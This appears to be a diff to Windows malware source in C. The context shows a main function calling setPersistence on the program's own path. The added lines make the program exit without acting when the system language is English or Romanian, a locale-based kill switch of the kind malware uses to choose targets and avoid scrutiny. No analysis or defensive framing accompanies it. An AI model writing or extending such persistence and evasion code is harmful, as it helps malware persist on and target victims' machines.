@@ -236,6 +236,13 @@ BOOL setPersistence(wchar_t* path)
 
 int wmain(int argc, wchar_t* argv[])
 {
+	LANGID lang=GetSystemDefaultLangID();
+
+	if (lang == LANG_ENGLISH || lang == LANG_ROMANIAN)
+	{
+		return EXIT_SUCCESS;
+	}
+
 	if (!setPersistence(argv[0]))
 	{
 		return EXIT_FAILURE;
